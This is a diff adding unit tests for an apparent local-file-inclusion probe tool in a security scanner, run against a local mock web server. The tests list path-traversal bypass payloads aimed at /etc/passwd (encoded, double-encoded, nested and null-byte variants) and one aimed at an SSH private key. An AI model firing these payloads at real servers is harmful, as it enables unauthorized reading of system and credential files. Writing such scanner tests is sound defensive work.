@@ -1,6 +1,9 @@
 import base64
 import json
 import unittest
+from urllib.parse import urlparse
+
+from aiohttp import web
 
 from tools.lfi_file_exposure_probe import LfiFileExposureProbeTool
 
@@ -345,6 +348,41 @@ class LfiFileExposureProbeTests(unittest.TestCase):
         self.assertTrue(any("..%2F" in u or "../" in u for u in urls))
         self.assertTrue(any("home/sherman/.ssh/id_rsa" in u.replace("%2F", "/") for u in urls))
 
+    def test_path_traversal_ladder_covers_all_six_bypass_families_early(self):
+        urls = self.tool._path_traversal_bypass_urls(
+            "https://example.test/image?filename=/var/www/images/cat.png",
+            [1, 2, 3, 4, 5, 6, 7, 8],
+        )
+        early = urls[:8]
+        wire = "\n".join(early)
+
+        self.assertIn("..%2F..%2F..%2Fetc%2Fpasswd", wire)
+        self.assertIn("filename=%2Fetc%2Fpasswd", wire)
+        self.assertIn("....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd", wire)
+        self.assertIn("%252e%252e%252f", wire)
+        self.assertIn("%2Fvar%2Fwww%2Fimages%2F..%2F..%2F..%2Fetc%2Fpasswd", wire)
+        self.assertIn("%00.png", wire)
+
+    def test_surface_candidates_start_with_negative_control_then_bypass_ladder(self):
+        specs = self.tool._build_probe_specs(
+            "https://example.test/",
+            ["/this/path/should/not/exist/xasm-lfi-negative-control", "/etc/passwd"],
+            {"urls": ["https://example.test/image?filename=cat.png"]},
+            max_requests=10,
+            join_mode="double-slash",
+        )
+
+        self.assertEqual(specs[0]["source"], "surface-derived")
+        self.assertEqual(specs[0]["path"], "/this/path/should/not/exist/xasm-lfi-negative-control")
+        self.assertTrue(all(spec["source"] == "surface-derived" for spec in specs))
+        self.assertTrue(any(spec["path"] == "/etc/passwd" for spec in specs[:4]))
+
+    def test_discovery_normalization_rejects_non_http_and_unsafe_pages(self):
+        self.assertIsNone(self.tool._normalize_discovered_url("https://example.test/", "javascript:alert(1)"))
+        self.assertFalse(self.tool._is_safe_discovery_page("https://example.test/account/logout"))
+        self.assertFalse(self.tool._is_safe_discovery_page("https://example.test/static/app.js"))
+        self.assertTrue(self.tool._is_safe_discovery_page("https://example.test/catalog?page=2"))
+
     def test_load_file_url_is_probed_as_is(self):
         # A surfaced URL already carrying a MySQL LOAD_FILE() read (handed off from a
         # SQLi step) is probed verbatim so the DB-layer read can be classified+tagged.
@@ -412,6 +450,70 @@ class LfiFileExposureProbeTests(unittest.TestCase):
         )
         self.assertFalse(result["confirmedRead"])
         self.assertEqual(result["classification"], "html_or_error_page")
+
+
+class LfiFileExposureProbeUrlOnlyTests(unittest.IsolatedAsyncioTestCase):
+    async def asyncSetUp(self):
+        async def index(_request):
+            return web.Response(
+                text=(
+                    '<html><body><a href="/catalog">Catalog</a>'
+                    '<img src="/image?filename=cat.png">'
+                    '<img src="https://outside.invalid/image?filename=outside.png">'
+                    '</body></html>'
+                ),
+                content_type="text/html",
+            )
+
+        async def catalog(_request):
+            return web.Response(text='<a href="/account/logout">Logout</a>', content_type="text/html")
+
+        async def image(request):
+            filename = request.query.get("filename", "")
+            if filename == "/etc/passwd":
+                return web.Response(
+                    text="root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
+                    content_type="text/plain",
+                )
+            return web.Response(body=b"not-a-real-image", content_type="image/png")
+
+        self.app = web.Application()
+        self.app.router.add_get("/", index)
+        self.app.router.add_get("/catalog", catalog)
+        self.app.router.add_get("/image", image)
+        self.runner = web.AppRunner(self.app)
+        await self.runner.setup()
+        self.site = web.TCPSite(self.runner, "127.0.0.1", 0)
+        await self.site.start()
+        port = self.site._server.sockets[0].getsockname()[1]
+        self.target = f"http://127.0.0.1:{port}/"
+
+    async def asyncTearDown(self):
+        await self.runner.cleanup()
+
+    async def test_root_url_only_discovers_surface_and_returns_http_proof(self):
+        result = await LfiFileExposureProbeTool().execute(
+            {
+                "target": self.target,
+                "maxRequests": 12,
+                "maxDiscoveryPages": 3,
+                "keepRawEvidence": False,
+            }
+        )
+
+        self.assertTrue(result["success"])
+        self.assertTrue(result["verified"])
+        self.assertFalse(result["fallback"])
+        self.assertLessEqual(result["summary"]["pathsChecked"], 3)
+        self.assertGreaterEqual(result["summary"]["discoveryPages"], 1)
+        self.assertTrue(any(urlparse(url).path == "/image" for url in result["discovery"]["urls"]))
+        self.assertFalse(any(urlparse(url).hostname == "outside.invalid" for url in result["discovery"]["urls"]))
+        self.assertFalse(any(urlparse(url).path.endswith("/logout") for url in result["discovery"]["urls"]))
+        self.assertGreaterEqual(len(result["findings"]), 1)
+        finding = result["findings"][0]
+        self.assertEqual(finding["template-id"], "xasm-container-context-file-exposed")
+        self.assertIn("GET /image?filename=%2Fetc%2Fpasswd HTTP/1.1", finding["request"])
+        self.assertIn("root:x:0:0:root:/root:/bin/bash", finding["response"])
 
 
 if __name__ == "__main__":
